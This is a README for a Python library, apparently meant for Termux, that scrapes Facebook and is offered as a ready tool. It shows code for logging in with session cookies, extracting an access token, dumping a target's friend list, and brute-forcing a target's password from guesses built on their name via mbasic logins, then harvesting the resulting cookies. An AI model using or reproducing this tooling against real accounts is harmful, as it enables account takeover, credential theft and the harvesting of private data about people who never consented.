# Facebook
Library sederhana yang dibuat dengan metode scraping.

installation in termux.
```python
$ pkg update && pkg upgrade
$ pkg install python git -y
$ pip install git+https://github.com/tukiphanz/fb
```

# Facebook: login session
Login to the library using session.
```python
import requests
from facebook import Facebook

session = requests.session()
session.cookies['cookie'] = 'your Facebook cookies'
fb = Facebook(session)
```

# Facebook: get eaab token
Please use the login code above first.
```python
response = fb.scrape_token() # output dictonary
print(response)
```
example output if successful.
```python
{'status': True, 'date': '8/7/2024', 'data': {'token': '...', 'cookies': '...'}, 'coder': {...}}
```

# Facebook: dump friendlist
Make sure the target account's friendships are public or you have to be friends with the target.
Please use the login code above first.
```python
id = '1000083836282828' # example
token = fb.token
cursor = None # The second request of dump_friendlist will return a cursor, please use it.
response = fb.dump_friendlist(id=target_id, token=token, cursor=cursor) # output dictonary
print(response)
```
example output if successful.
```python
{}
```

# Bruteforce
```python
from facebook import Bruteforce

id = '1000083836282828' # example
name = 'ayunda sari'
bf = Bruteforce(id=id, name=name)
```

# Bruteforce: password generator
Please use the login code above first.
```python
response = bf.password_generator(name=name) # otuput list
print(response)
```
example output
```python
['ayunda123', 'ayunda1234', 'ayunda12345', 'ayunda321', 'sari123', 'sari1234', 'sari12345', 'sari321', 'ayundaayunda', 'sarisari', 'ayunda sari']
```

# Bruteforce: login mbasic
Please use the login code above first.
```python
response = bf.login(id=id, password=password) # output dict
print(response)
```
example output if successful.
```python
{'status': True, 'date': '...', 'data': {}, 'coder': {...}}
```
For example, take the cookies.
```python
cookies = bf.gyatt.cookies.get_dict() # output dict
print(cookies)
```
